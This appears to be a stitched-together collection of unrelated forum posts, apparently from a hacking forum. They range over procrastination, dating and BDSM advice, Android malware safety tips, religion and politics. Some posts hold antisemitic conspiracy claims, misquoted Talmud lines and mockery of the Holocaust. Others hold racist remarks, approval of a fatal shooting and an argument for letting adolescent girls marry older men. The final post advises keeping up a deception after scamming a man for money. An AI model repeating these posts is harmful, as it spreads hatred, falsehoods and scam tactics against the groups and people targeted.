So hi. For all my life I've been handling myself pretty good: Good grades, listening to parents, etc etc, keeping myself healthy and safe from harm. When I was like 8-9, there was a computer project I volunteered to do. I didn't do it. You'd think this crap is minor, but that's the key of all my problems: I can not bring myself to perform a task that stands out as not completely required by law. It has gotten to the point of me slowly drifting away from school missions and not learning for them, avoiding doing homework for my project, even not doing the 1 thing a job provider wants me to do to prove myself eligible (computing). This is literally the most retarded thing in this thread, I know, it's the true form of first world problems, but I can't do anything about it. I consider it a mixture of Depression and huge laziness, whatever, I just can't fucking anything done in time these days. Stuff like ""I'm good, I'll do it later"" etc is my usual self-excuse. Instead of doing what I need, I keep myself busy with social networks (Reddit, 4chan) even gaming (CSGO). This issue started out when I was little and now I'm seeing the full explosion of it => I don't know how to handle deadlines, have work motivation, or be trustworthy to get something done.

However, exceptional case, I challenged my female friend to learn subjects X Y Z in an an hour in a skype call. I didn't thought it'll actually make my ass move, but it did. i HATE losing, and I love to be challenged. Now, how am I taking this form of an obnoxious personality into getting motivation?

It is easily to understand, social pressure nowadays is quite big and children are being forced to grow up. Also in my country getting a ""relationship"" with someone goes like this:

Go to a party, get drunk, make out with eachother, the next day you have a relationship. You can obviously conclude that this won't last long because it was just a decision made as a result of a previous non-concious event.

It's more of an affair rather than an actual relationship we're talking here but teens tend to see it as an relationship."

The Bible was written by people insiperd by God. Why doesn't the extreme stuff apply in Islam but not in Christianity? You do know muslims don't fully follow the Qur'an? Most people don't even read it.

""Thessalonians 4:7-8 
For God did not call us to be impure, but to live a holy life. Therefore, he who rejects this instruction does not reject man but God, who gives you his Holy Spirit."" 

-- Offtopic

I've been to many middle eastern countries in my life and I assure you that most of the countries don't look like Pakistan. These ""terrorist muslims party"", hit on women, listen to music and enjoy life just as much as we do. Islam in Syria before the war consisted of going to the Mosque on fridays, hear a Sheikh preach about how to be a better person and go home. 

Islam was just as secualar as Christianity, Cairo was the city of fashion. Americans and Europeans went Iran for holidays back in the days

These are pictures taken Middle East decades ago.

''Within 100 years'' Yet you asked for during his lifetime.  Plus it names Josephus as one, when he did write about Jesus.

Also on your other point about walking on water & such.  It did effect these people. Hence they became Christians, hence they worshipped Jesus or saw him as the messiah.  That's the reason Christianity started & grew in the first place.  I am sure many writings were lost or destroyed, or got incorporated in some form to the bible.

Not to mention Jewish leaders simply outlawed most writings.  So people would have been reluctant.  Those who did may have been damning or hostile towards Christians which a couple were that we do have.  The important facts are numerous Jewish sources/writers, Roman & Christians all have accounts from different sources about Jesus that do in fact match up overall. 

They all describe somebody who had followers, committed 'sorcery'(water into wine etc) was exposing the hypocrites & who ultimately was hanged(crucified) by Pilate and if he wasn't, would have been stoned to death by the Jews.    So its clear he existed. Its clear he was doing some extraordinary acts which the Jewish described as sorcery but we know was divine healing & such.....its clear he had multiple followers who saw him as the messiah.  

All information we have completely checks out with the bibles account of Jesus.  Absolutely none contradicts it even though some were from hostile sources(anti Christian roman historian, Jewish anti Christian writer)

He was against the authority of Jewish leaders. And he did promote more respect towards women.  Yes I think this is clearly the nature of Jesus.

You wont find any writings during his lifetime. They would have been lost/destroyed or passed on in a way which meant they became later writings.  That's that.

Also just because somebody thinks you're made for someone else or are perfect together doesn't mean that you are, they know nothing about your private lives, like the arguments you may have and everything.

Just ask her, you have nothing to lose, if she says no you still have a friendship, don't let your love for her ruin a friendship, you can happily move on but don't ruin your friendship and that's stupid.

Also just ignore your friend, if it's his cousin or not he doesn't decide who she can like or who she can talk to, just ignore him, if you want to try, then try, it's worth a shot.

The amount of people it effected is astounding. Her father is gonna walk her down the aisle in a coffin as oppose to a beautiful white dress.

Have a baby. Feel anxious sending her child off to school for the first time. Some one murdered her with their words. Someone like you. I'm naive to believe you will never send hate again , but from my message please learn 2 things . It takes few kind words to save someone's life. And it takes few cruel words to end one. Thanks.

27313506,"Following are five quick tips to help you keep your Android handset free of malware.

Always research the publisher of the app. What other apps does it offer? Do any of them look a bit shady? If so, you should probably stay away.

Read online reviews. Android Market reviews may not always be truthful. Check around to see what reputable Websites are saying about the app before you hit the download button.

Always check app permissions. Whenever you download or update an app, you get a list of permissions for it. An alarm clock app, for instance, probably shouldn't need to look through your contacts. The general rule of thumb: If an app is asking for more than what it needs to do its job, you should skip it. 

Avoid directly installing Android Package files (APKs). When Angry Birds first came to Android, you could get it only through a third party. This is called ""sideloading,"" or installing apps using an .APK file. Although Angry Birds wasn't malware, in general it is highly advisable not to download and install .APK files that you randomly come across. Most of the time you won't know what the file contains until you install it--and by then it's too late.

Put a malware and antivirus scanner on your phone. Although many people still think that antivirus scanners on phones are useless, maybe outbreaks such as this one will change minds. Several different big-name security companies already offer mobile-security options, many of them free. I myself had downloaded ""Spider Man,"" which is on a bad-apps list. My Lookout software identified it as a Trojan horse.

I never actually promised to finish it, sorry. It'd take a lot of work to implement the different transition effects that the iphone app has, and without a device to test things on, it'd be a complete nightmare. I'm not even entirely sure that I'm skilled enough to do those... yet :)

My experiments with the .ipa files were mainly tests to see if the app would at all work on iphones for future reference and maybe other projects. Like I mentioned earlier, my girlfriend has a 3GS, so I initially considered resizing the app for her. But since then I found out that I wouldn't be able to install the app on her non-jailbroken iphone without a real apple developer certificate and also the fact that the iphone app is more complex with its transition effects.

You can encourage people in the society, through media of course to believe in things like caring about elders, caring about history, caring about our past and so on. The media doesn't do that today, the media encourages porn, nudity, gays, feminism(who isn't really feminism), communism, materialism that makes people selfish and so on. There is propaganda everywhere and this is a part of the system itself.

For an example, they don't encourage the traditional values like man and woman relationships, kids, caring about elders, you get my point.

Rent some cary grant films, copy his attitude and bantering for the flirty part. To help you charm people follow these steps:

Smile with your eyes (squinting them)
Your goal in every conversation is to make the other person feel interesting as fuck - this means always act like you are genuinely super interested in what they're saying - no matter how boring.
As for their name and use it often and it will create closeness
Learn to read and feign body language
Face the person and point your heart towards theirs when you talk
Eye contact
Ask questions, etc, talk about positives
Don't talk shit about people

For the super nice part

Realise girls are the same as you and start having the attitude that you're not going to settle. Gain integrity and start genuinely believing that it's a girls loss when they don't want anything. As you do this more girls will start sensing your 'non-hungry' state, and this is when they really start coming in.

Atheism: disbelief or lack of belief in the existence of God or gods.

Take this scenario
2 atheists, 2 Christians:

A1: Hi, I'm an atheist.
A2: Hi, I'm an atheist too.
A1: I get my morals from anger and spite, the feelings I have towards all of those who let me down.
A2: I get my morals from logical thinking and empathy.

C1: Hi, I'm a Christian.
C2: Hi, I'm a Christian too.
C1: I get my morals from god.
C2: I also get my morals from god.

BDSM - Bondage and Discipline (BD), Dominance and Submission (DS), Sadism and Masochism. 
HOWEVER, THIS SHOULD NOT GO TO YOUR HEAD. 

When it comes to BDSM (holy shit, I could write an entire 999 threads on this and still not be done), it's about a few key things. 
TRUST. - Trust is an absolute fucking must. 
CONSENT - Trust me, it can be easy to forget yourself in the moment, but that doesn't mean shove a 9 inch cock in her ass because
she's enjoying the spanking you gave her. 
SAFETY - Your partner and yourself must always be safe when practicing. 
RESPECT - Respect your partner and their boundaries. 
---

To be honest, I seriously...seriously dislike newcomers to the scene, even if their JUST breaking the ice only to spice up the relationship. 
I can't lie, it's an entirely GREAT and amazing way to spice it up. However, a lot of newcomer males get it into their head that punishment
means to just beat the shit out of their partner. 

If you want to spice it up, get a small 2 foot whip, a paddle, use your hand to spank her. Go lightly at first, and then a little harder. 
But never go hard enough to leave visible bruising and don't intentionally try to hurt them. It's not about the pain. She doesn't _want_ 
pain, she wants the emotional connection it comes with. When it comes to BDSM, or ANY type of play at all it's about the emotional
connection you feel, the respect given, and the trust you give and have in your partner. If you fuck that up even once, it's incredibly
difficult to get it back. ._. 
---
While I realize you're just wanting basic info and what you think of spanking her - and it seems like I'm dumping a ton of un-needed 
information on you, it's because I'm really passionate about this type world and I seriously hate it when people get the wrong idea or
tend to fuck it up for others. It can actually be a really fun aspect in any relationship... so long as you do it right. 
---

For now she wants to be spanked, or punished really, which can include spanking, a little light slap on her boobies, maybe cuffing her. 
THere is a ton of things you can do to spice it up. Next time you have sex, try blindfolding her or holding down one of her wrist (how
about tying just one of her wrists down to the bed or something). 

No but seriously, I could go on forever about this. ._.

Cheating on people fucks them up mentally if you were really close. It breaks them.

She basically admitted herself that she was screaming on him since he “scared her children” by starting his car. Also, even if he had said anything offensive to that stripper it still isn’t acceptable to be racist, call him the n-word and tell your children to call him a n i gger.

That being said these type of events happens constantly in the US and all around the world. I’m not really sure why the media picked up on this particular video.

This is sales trashing because some people may see his comment and not bother to look at the OP for proof.

I don't want to get banned for a false reputation from some nonce who can't be bothered to earn so he hates on others and what happens happens.

What about in Romans chapter 1 wherein it states God, himself, created homosexuals.

Romans 1:26-27
For this cause God gave them up unto vile affections: for even their women did change the natural use into that which is against nature:
And likewise also the men, leaving the natural use of the woman, burned in their lust one toward another; men with men working that which is unseemly, and receiving in themselves that recompence of their error which was meet.

He then condemns them for it? It doesn't even matter. If you hate gays, I better not find you eating shrimp or wearing polyester. Enjoy hell if you do."
40506170,"Understood. The context argument comes in when someone claims to know the meaning of a given scripture that is completely irrelevant to the rest of scripture.

For example, many people have used this argument against the social community of Christians:

""In the Old Testament, it says 'A man shall not lie with a man as with a woman; it is an abomination...', so the bible says that all gays are the devil and Christians are supposed to hate them, and if you're a Christian and you don't hate gays you are inconsistent!""

This is a false assertion because whoever read this statement from the Old Testament completely ignored the New Testament, where, in the New Covenant, man no longer has lasting judgement on one another, and you are meant to love your neighbor as yourself, and teach the love of Christ and his reconciliation of us to the Father.

So the true conclusion when reading the example OT verse should be: ""According to the Bible, homosexual acts are sinful, and if you are unrepentant of that sin, you go to hell, but if you have faith in Jesus and repent, you go to heaven.""

THAT is the context argument. I understand that language is flawed in the ways that you have presented, but some things are black-and-white, and deserve argumentation to defend them."

Jefferson:

To an extent rarely acknowledged, Jefferson also despised Jews - or at least the Jews of the Old Testament and the religion it seemed to spawn. The ""vicious ethics"" of the Jews were ""irreconcilable with the sound dictates of reason & morality,"" encouraged poor relationships between people and were downright ""repulsive and anti-social, as respecting other nations."" When he began to sketch out a ""syllabus"" about the life of Jesus, Jefferson explained that the Jewish god bore attributes that ""were degrading and injurious."" Moses was depicted as ""cruel, vindictive, capricious and unjust."" Though his negative attitude about Judaism seemed mostly confined to antiquity, he occasionally revealed an up-to-date bias. Referring to irksome New England federalists, Jefferson declared that ""they are marked, like the Jews, with such a perversity of character, as to constitute, from that circumstance, the natural division of our parties. "" Referring to the Quaker tendency to support the British, he said contemptuously, ""dispersed, as the Jews, they still form, as those do, one nation, foreign to the land they live in.""

It is only now with this era of political correctness people don't as openly criticize jews.

> Christians are overrepresented in the justice system
> Atheist are underrepresented

OMG THE ONLY LOGICAL CONCLUSION I CAN ALLUDE TO IS THAT ALL CHRISTIANS HAVE MENTAL DISEASES AND ARE VIOLENT CRIMINALS. WHAT A SCIENTIFIC DISCOVERY. 

OP is fucking stupid. This is just a shit news paper using biased studies (just because it is a study does not mean it is infallible) to make ignorant sheep otherwise known as christians to feel good about themselves. 

Atheist have higher IQs. 

""Atheists tend to be more intelligent than religious people, according to a US study.

Researchers found that those with high IQs had greater self-control and were able to do more for themselves - so did not need the benefits that religion provides.

They also have better self esteem and built more supportive relationships, the study authors said.""

""The conclusions were the result of a review of 63 scientific studies about religion and intelligence dating between 1928 and last year.


In 53 of these there was a ‘reliable negative relation between intelligence and religiosity’. 

In just 10 was that relationship positive.""

""Even among children, the more intelligent a child was the more probable it was that they would shun the church.

In old age the same trend persisted as well, the research showed.

The University of Rochester psychologists behind the study defined religion as involvement in some or all parts of a belief.

They defined intelligence as the ‘ability to reason, plan, solve problems, think abstractly, comprehend complex ideas, learn quickly, and learn from experience’.

In their conclusions, they said: ‘Most extant explanations (of a negative relation) share one central theme - the premise that religious beliefs are irrational, not anchored in science, not testable and, therefore, unappealing to intelligent people who ‘know better’.

‘Intelligent people typically spend more time in school - a form of self-regulation that may yield long-term benefits.

‘More intelligent people getting higher level jobs and better employment and higher salary may lead to higher self-esteem, and encourage personal control beliefs.’

""Study co-author Jordan Silberman, a graduate student of neuroeconomics at the University of Rochester, said: ‘Intelligence may lead to greater self-control ability, self-esteem, perceived control over life events, and supportive relationships, obviating some of the benefits that religion sometimes provides.' ""

In a sense, your relationships with friends and girlfriends all need to set an initial mood and expectations. That's where you have to show and let it be know your intentions. If you let a friendly mood set and the expectations to be that you'll be a friend worth always keeping, then don't act like they're bitches or assholes for not being able to change that platonic mindset when you made it such a routine and normality for it to be that way. You have to let it all be known early on so they get used to and understand that you want something more than friendship, even if not right now."

for instance, a friend of mine wanted to date this girl in highschool.. but he was too scared at the time, so he befriended her... Now, about 6 years later, he actually wants a serious relationship with her (and has vocalized it as such), but she will not because she doesn't want it to ruin their friendship.

That's my definition of the friendzone... it's only a wall if you let it get that way with a person."

36098280,"I thought I'd say something about this whole friend zone thing seeing as people keep using it as though it's some sort of mythical hell for lovers and nice guys. There is no such thing as the friend zone. It's an excuse people make when they treat every friendship with a girl/guy as a sort of project or investment, thinking they deserve something for just being friends with this person. Now a few reasons why some of you may think such exists is because you fail to take advantage of the initial opportunities and lead the girl or guy in thinking your intentions are strictly friendship. If you pussy out and pretend you're only in it for friendship with a friend when you clearly want more, then you really don't deserve to be with that girl or guy anyways. Without confidence, communication, and persistence, you're practically just another guy or girl to him or her. It does not matter if you're Mr. Rogers, welcoming her to the neighbourhood, or a guy who's willing to listen to all her crap and cuddle with her when she's down, YOU and only you are responsible for the position you put yourself in with your crush. Now some instances where she may not be interested in is if you lack some sort of physical attraction, and even then it isn't that big of a factor. Not to mention, who the fuck wants to be with a girl who's shallow anyways? That further proves the girl is not worth it. Now I've also seen a lot of people suggest doing the whole, ""Kindergarten Lovin"" technique, where you act like an asshole to a girl so she thinks you're an ""Alpha Male"". Some of the most stupid shit I've ever heard. Just be yourself, and have the balls to say what's on your mind, not what you think you should be saying.

It's you that lacks logic.

Great. You care about people and want to help them. How is that going to happen? How are we going to help these countries? By sending them aid, and ceasing the senseless and intentional displacement of these people via bombing by corrupt governments such as the Obama administration.

How are we going to send aid? By producing goods and having successful economies in our own countries.

------
Having millions upon millions of unsustainable refugees, many of which are seeking to only exploit the system isn't helping these people in the long run. It's destroying the only countries that give their own countries hope of ever recovering.

It's basically like having an infected arm. Instead of cutting it off, and saving your life so that you can use your brain to build a nice robotic arm to replace it, you just let the infection spread to the rest of your body and kill you because it would be ""unethical"" and unfair to that arm to cut it off.
------

Letting millions upon millions of unsustainable refugees from radical countries pour accross borders is counter productive and completely illogical. It's designed to be that way by our governments who are trying to collapse world borders and bring about a ""globalist community"".

***IFRAME***[https://www.youtube.com/embed/bHWpMjVT1_Q?autoplay=0&origin=https://hackforums.net]***IFRAME***

So basically, the US government creates ISIS via the CIA. Now they ""accidentally"" bomb syrian soldiers AGAIN, and even Russia is calling them out on their bullshit. Right after the US bombs the syrian soldiers protecting a major city, ISIS launches an assault and murders hundreds of women and children.

Now even more refugees pour into Europe from those areas because of what the US government did.

Then, idiots go out and lump ordinary citizens in with the government and say ""well put yourselves in these peoples shoes"" or ""You are the ones who are causing this in the first place, so you are obligated to help them"".

Correction: No ordinary citizen is responsible for any of this. Did I go out and vote to bomb these places? Do I have any sort of a say in what goes on in Syria? Do I get to vote whether or not we should have all of these senseless bombings and drone strikes displacing these people in the first place? NO.

So then why is it now suddenly my fucking problem?

It's all illogical to the core. My analogy above of an infected arm infecting the rest of the body is a perfect representation of just how illogical most people are when it comes to this particular issue. People are using emotion rather than logic to make decisions. That's one of the root causes of many of our problems today. Liberals practically base all of their decisions off of feelings rather than logic."

Thats actually completely false. The Travon Martin has an EXTENSIVE RAP SHEET for gang related violence as well as breaking and entering.

Also, you should probably speak to the 4 eye witnesses, 2 of which who have released their statements, who ALL Say travon martin attacked zimmerman. You dont get a upper cranial injury, a broken nose, and grass stains from chasing someone down and shooting them in cold blood, you get them from being blitzed, knocked to the ground, and punched in the face. 

To be honest, im glad he shot the kid, its one less gang banger ambushing and killing innocent people. If it had been a black female night watchmen, this bullshit wouldnt be on the news at all.

This whole fucking story is nothing but a power play by the media, just like casey anthony before this, and the million other stories that didnt matter, still dont matter, and wont matter EVER. 

Bottom line, the area was having multiple break ins by AFRICAN AMERICANS, the kid DID NOT LIVE THERE, it was LATE AT NIGHT, the community is GATED, it has a CURFEW, which meant he JUMPED A FENCE (Which is a FELONY (its breaking and entering due to the fact the community as a whole is a property ((gated communities are considered private property residences)) and TRESSPASSING) those are BOTH crimes, he was guilty just by being there. 

He could have easily taken his happy ass soda, his bag of  skittles, walked AROUND the PERIMETER of the area, he wouldnt have been where he shouldnt have been, he never would have MET zimmerman, he wouldnt be DEAD, I wouldnt be hearing about it. 

I dont take pity on assailants, I dont take pity on zimmerman, I dont give a fuck about any of  them involved. They were both low life scum, both had rap sheets, but everyone and I mean EVERYONE! even pedophiles, have  the right to self defense and a fair trial."

***QUOTE***Quote:This is my favorite part. The acts of the deviant few characterizing the many. To understand terrorism you have to understand Jihad. Jihad is both the internal struggle of a Muslim to be a better Muslim, and the external struggle of getting the world to be better Muslims - in a defensive way. That's the key distinction to note here. Muhammad's raising of an army to conquer Mecca (which he succeeded in doing) is seen as the perfect embodiment of external Jihad. People came to attack him and ruin his way of life, so he retaliated. This is contrary to the Christian ideal of ""turn the other cheek"", which advocated pacifism.

Terrorist groups such as Al-Qaeda and the Taliban have their origins (if not directly than in spirit) in a group called the Muslim Brotherhood. The Muslim Brotherhood started as a religious study group. They simply got together and talked about the Qu'ran. They evolved to providing social services like daycare and food for the needy as their membership increased. This was all fine and well, until the Egyptian Government felt threatened by (or resentful of) their provision of social services. So they oppressed the Brotherhood, forcing some of the radicals to classify them as Jahili (ignorant of God;evil), and act out of Jihad (defensively). The extremists took this approach and ran with it, and it evolved into the terrorist organizations you see today. You see less Christian terrorists (although there are still plenty) because the Christian faith (as a whole) is a far more passive one. In Islam, the concept of Jihad, the struggle, is more easily misunderstood and open to manipulation by radicals.***QUOTE***"

Narcissistic Personality Disorder
An all-pervasive pattern of grandiosity (in fantasy or behaviour), need for admiration or adulation and lack of empathy, usually beginning by early adulthood and present in various contexts. Five (or more) of the following criteria must be met:

1) Feels grandiose and self-importance (e.g., exaggerates achievements and talents to the point of lying, demands to be recognized as superior without commensurate achievements);
Check ✓

2) Is obsessed with fantasies of unlimited success, fame, fearsome power or omnipotence, unequaled brilliance (the cerebral narcissist), bodily beauty or sexual performance (the somatic narcissist), or ideal everlasting, all-conquering love or passion;
Check ✓

3) Firmly convinced that he or she is unique and, being special, can only be understood by, should only be treated by, or associate with, other special or unique, or high-status people (or institutions);
Check ✓

4) Requires excessive admiration, adulation, attention and affirmation - or, failing that, wishes to be feared and to be notorious (narcissistic supply);
Check ✓

5) Feels entitled. Expects unreasonable or special and favourable priority treatment. Demands automatic and full compliance with his or her expectations;
Check ✓

6) Is ""interpersonally exploitative"", i.e., uses others to achieve his or her own ends;
Haven't personally witnessed this... yet... ✗

7) Devoid of empathy. Is unable or unwilling to identify with or acknowledge the feelings and needs of others;
Has kind of displayed this on HF

8) Constantly envious of others or believes that they feel the same about him or her;
Haven't personally witnessed this... yet... ✗

10) Arrogant, haughty behaviours or attitudes coupled with rage when frustrated, contradicted, or confronted.
Check ✓

Displaying that many symptoms of a personality disorder, so blatantly and clearly, should hopefully be a wake up call for him that maybe there is an underlying issue here. Maybe 99.9% of this community aren't jealous dumbasses and maybe he is the one at fault. Maybe he should seek assistance from a 3rd party. Unfortunately, with this specific personality disorder, I think it's exactly the type of disorder that's going to cause him to think that he's the exception, that he actually is THAT smart and successful and amazing, and that this doesn't apply to him at all."

Except he didn't. Look what the Jews did to the world. There is a reason that they've been kicked out of every country they've ever lived in. Are you saying that everyone else is the problem? Why don't you ever mention the Communist Jews that killed over 60 million under Stalin's rule? Why don't you ever mention the Communist Revolution in 1918 in Germany? Or perhaps how the Jews control nearly every western institution, from media to pharmaceuticals to the banking system? Or perhaps how the illegal state of Israel is massacring Palestinians? What about the insane amount of child rape cases in Jewish communities? Or the ridiculous statements in the Talmud like Sanhedrin 59a ""Even the best of the Gentiles should be killed."" or Yebhamoth 11b ""Sexual intercourse with a little girl is permitted if she is three years of age.""?

Oh but yes of course. Let's disregard all of that and focus in on the 6 trillion Jews that got burned to death by evil German nazis."

No. I never said ""all"" but I guess I'll clarify that I don't mean all. To say I know something about every single person in a group would be wrong because I don't know everyone. It shouldn't be necessary to specify that. You are quoting me saying ""all ..."". Would you like to find that quote for me? I want to read it again, because I haven't even used the word ""all"" in any of my posts on this thread, making this paragraph semi-irrelevant. The difference between me and Trump (is so large that I can't even believe this is something I have to say) is that when I'm asked ""YOU MEAN ALL OF THEM?"", I say no because I don't mean everyone. He says he's right and won't re-word what he said. So no, that's not hypocritical at all.

That of ""scamming is scamming"" is as saying that Robin Hood is the same as Osama bin Laden because both killed people (and yes, I know that Robin Hood it is a legend most than anything and not a historical figure).
Besides, technically the law defines what is a scam and what it is not a scam. If the law judges scams diferently, based on the way they were made, then it is obvious that there is a diference between them."

Honestly, I really don't think that matters.
When you converse with the guy, make sure that the conversation is interesting enough, or keep him hooked and wanting to talk to you rather than worrying about how many letters are put.

You're right about it being offsetting, but it's not that obvious to the people on the other side of the scheme to be quite honest.

Policies are usually defined by a persons upbringing, family life can play a huge part in ones state of mind.
While this isn't always the case as some people get older, the life one lives will always alter how one thinks.

Having a family life in America is a huge factor in who becomes president - It's like not being christian or catholic could affect your position/stance in the election.

I however believe America should change completely to Technocracy (one of my past usernames on HF) This would be the best option overall and allow a more openly discussed scientific approach to circumstances and the way the world is.

America needs to be run by the smartest - over the history of human kind, tribes and cultures were run by the strongest leader. (usually physically) as that played a huge part in being an ""Alpha male"" - by being the strongest leader, most recognizable, you would be welcome to more food and women.

This is no longer needed and hasn't been needed for a long time - The future will be presented to us by those who have the brain power to do so. If we were to choose a leader based on their intellect and leadership skills as someone who can make the ""right"" decision at the ""right"" times, America would be made great again

By choosing Donald Trump over Bernie and Hillary - we are choosing to not follow the trend of first picking someone because we haven't had one of them before. (Female president) and we wouldn't be choosing someone because they seemed like the most responsible party.

Donald Trump might not be the best Presidential candidate but out of the selection we are given ( through the other candidates also ) he is the best choice.

He is creative in how he thinks, the government clearly isn't functioning how it should and any success that Donald might have in parliament will be credited almost directly to the setup that Obama set in motion.

While I believe the above to be true - In short.

Donald Trump is the best choice for THIS election.

In future elections we need better choices or change to Technocracy.

This makes no sense. How could God have created Himself?

Doesn't the act of creation automatically imply the antecedent presence of a creator?

In other words, wouldn't God have already existed before creating Himself, thus undermining your original premise?

Either God, if He exists, has always existed, or He doesn't exist at all. It is as simple as that.

This notion that He is His own creator is illogical and contradictory on its face.

Regarding the ethicality of religion, I have discussed numerous times in previous threads all of the wars, persecution, oppression, separation, and hatred which religious dogmatism has resulted in. Simply because certain individuals are resistant to committing religious violence does not mean that religion itself has not caused other, less intelligent people from engaing in destructive behaviors, such as persecuting people who aren't Christian or Muslim, for example.

Concerning the psychological models in question, I never stated that they were not universally valid; to say that I did is again a Strawman Fallacy.

I simply stated that you have not yet provided any unequivocal scientific evidence in support of the claim that they are.

It is fallacious to demand that I prove a negative when its opposite has not even been demonstrated yet.

***CITING***[https://hackforums.net/showthread.php?pid=22556135#pid22556135]***CITING***

1) As stated previously, you have not yet presented indubitable scientific evidence that the psychological models in question are universally applicable to all adolescent females on the planet, including the several hundred million who have not been specifically studied by actual psychologists.

2) It is a Red Herring fallacy to bring up laws involving alcohol (which many people over 21 abuse) or driving (which many people over 16 are unskilled at) in this discussion, and is a Strawman Fallacy to suggest that I contended the laws against marrying an underaged person should be abolished. Rather, I merely stated that each case should be examined individually, and if the adolescent girl in question can be proven to be of a consensual mind, then, logically, there is no problem with her decision to marry an older man. How one could prove such a thing is perhaps a matter of some debate, and goes into questions of philosophy as well.

3) As far as I'm concerned, what some psychologists believe does not have much importance unless it can be explicitly applied to all observable instances of the fundamental issue in question. Again, simply because one or two theorists believe that young women cannot make ""rational"" decisions concering their sexuality does not mean that none of them can. In fact, there are plenty of women above the age of 18 who make horrible decisions every day, sometimes resulting in their rape or murder. Therefore, it is fallacious to despotically impose a general law upon all potential agents involved merely because of this single theory which has not been ubiquitously proven."

I am not saying a single parent, or even a missing gender role would make it impossible to raise a child in a healthy way. I am just saying I feel both of those roles provide a child just what they need. For example, I love both of my parents, both are wonderful, kind and loving. However, there are things I enjoy doing with my dad, and then things I enjoy doing with my mom. When it comes to emotional support, I prefer to go to my mother. Not because I feel my father is not supportive or cannot provide that support, but rather I just feel more comfort coming from a feminine role. When it came to discipline or having the ""talks""(No not the birds and the bee's but just lectures) I actually much more preferred my father because he was strict, yet reasonable. However my mother when it comes to discipline is very irrational and emotional and usually counter-productive when it came to punishing me or trying to lecture me. I observe many of these same roles within my own friends parents, and majority of the time the roles match the gender.

Now I am not saying that one parent cannot take on these roles, or that gay parents cannot take on these roles and provide the same effects. I am saying, it is not always easy for a single parent to do so, specially when they are not capable of providing both types of parenting. I guess in the end it doesn't matter on the sexual orientation or whether or not the other partner is involved, but rather the individual. However, I am saying with single parents as well as gay parents(Depending on whether or not one of those roles are unfilled) I am sure they often have difficulties providing both of those kinds of roles.

I am sure you can imagine being a single parent is quite difficult for some people and then not so difficult for others. I believe the ones it is not so difficult for are the ones that are able to establish both of those roles.

Also, I would like to address when you said, "" (and heterosexual) "". I am not claiming gay or single parents have an impact on their child's sexual orientation.

With the tone and sentiment I will assume Christian.. I'll answer in that light. The absentee loving father you want to be a serf to let our species, our ancestors, live and die in pain and misery for 8000 generations while we died at 20 to broken teeth and sickness. Only to show up 300 generations ago and start making humans sacrifices and slaves of one another. Then after he tired of ordering men to murder other man and even entire populations he sent gentle Jesus to bring eternal Hell to the non-believers. You see before Jesus you were just denied the lords grace, but now he gets to punish you even after death. So 2000 years later your all loving father never took back the rules about not touching woman on their period, stoning those who swear too much, and hating homosexuals. All he did was reinforce that there is a man on high who can convict you of thought crime while you sleep and if you don't make the right propitiation's in the right way you will suffer in agony for eternity.

Sounds like a pretty bad heritage you are supporting no? (and I didn't even dwell on the horror of the last 2000 years.) Now consider if you are enough of a servant to get to heaven. Know what is up there? You get to sing his praises till the end of time. I'm sorry but that seems pretty hellish to me even without the endless wickedness from him before that.

You can make your own alcohol. I have an ex girl friend who used to do it in her barn. She had racks upon racks on homemade beer and wine. She never got taxed on it. I honestly think there's more to the government banning drugs than it not being taxable. I mean, honestly, you have what? Alcohol, cigarettes, Cigars, tobacco. My grandfather grew tobacco for years and it wasn't taxed until we sold it. Other than that we were able to keep it and roll as many cigarettes as we wanted.

My apologies, I did not mean to suggest you thought that, but often when someone does not try any recourse it is because of some imagined conspiracy against ""one of their own"".

So, if I understand you, she was discussing the ""gas chambers"" ""again"" (teachers have the leeway to revisit any subject or even topic as often as they like) and you politely raised your hand and pulled out your prepared ""40 pages"" and began reciting the work of anti-Semites, which presumably since you said nothing to the contrary, she permitted you to finish.

Okay, so if the above is all true and the only events that took place I can see why a teacher, politely waiting for your monologue to complete, which would have taken a great deal of time, would have reported you as a disturbance, but there is yet more to the story. Why did she allow you to finish? Did you recite verbatim Leutcher's work and if so do you think it is acceptable to deny the holocaust in class?

There shouldn't be a ban. Period. The reason why marriage is founded to be between a man and a woman is based off of religious justification. That's the problem. Banning homosexual marriage, in my opinion, is unconstitutional because you invoke religion to justify the ban.

I know that you consider that a normal life. Most people do in fact. Even I did, for quite some time.

But, that is the very cause of your unhappiness.

When you search for your self in friends, or in relationships, or in finances, then you become vulnerable to experiencing great suffering.

Rather than recognizing the stillness of your being as your true essence, you identify the story of yourself (friends, relationships, finances, etc.) as being you.

This is what the Buddha called the ficticious self. The self that identifies with a mental story, instead of a conscious presence.

It's a broken telephone making an accusation about one thing becoming a fact about another. I haven't checked on that story since, but  wasn't kidding, its 3 or 4 links back from the one the OP linked and you read about what the actual accusation was and that she wasn't sure if she was pressing charges... its not even good enough to be called hearsay.

I'm not saying people at this LA thing didn't get hurt or that there hasn't been any violence but saying cops were holding knives up to people and punching a woman in the face for peacefully swearing at a female cop? Its a bit dramatic with no evidence. You saw all the people with cameras in the videos I linked? that shit would be on CNN right now if they Texas chainsaw on the protesters."

Societal morals are based on the good of the people and the society as a whole while Abrahamic religious morals are based in the teachings of a book that also contains violent murders, slavery, and the role of women.

Jesus and Muhammad had great ideas but only as men, the religions based on their name are violent, hate filled, destructive and have no place in politics.

My parents influenced my morals too but if they happen to be a little violent or racist I would try to suppress those teachings. With religion either you are making up your own version of an Abrahamic religion or you are follow the rules of the bible and they don’t all have much to do with morals. Even the 10 commandments, only 2 of them relate to actual laws and the rest have no place being imposed on society (inb4 adultery: the bible says even looking on a woman with lust is adultery).

Its fine to influence laws based on your religious views of being kind to others or refraining from murder but when you extend that to banning homosexual marriage or encouraging an-eye-for-an-eye death penalties then you are pushing your religion onto others.

In some respects I agree with him. Loving your neighbor, in the time of Moses, meant loving everyone in your tribe as much as yourself, your kids, and your wife, but also there were clear rules on who to kill and for what. Most importantly there is no reason I will ever put a stranger ahead of my family as the bible commands, secondly, they deserve my respect but not the love I show myself. That's an extreme similar to the ""dick sucking "" extreme suggested in his analogy."

If you start to like this guy (seems so) you may just keep on talking to him like a girl. Tell him that you just lied to get money but you feel sooo bad now and that you want to pay him back and stuff. I wouldn't tell him you've e-whored him. Just tell him you tried to get his money but now after the video you feel so bad (act like a girl) and that you still want to talk with him and stuff.... He may understands it.

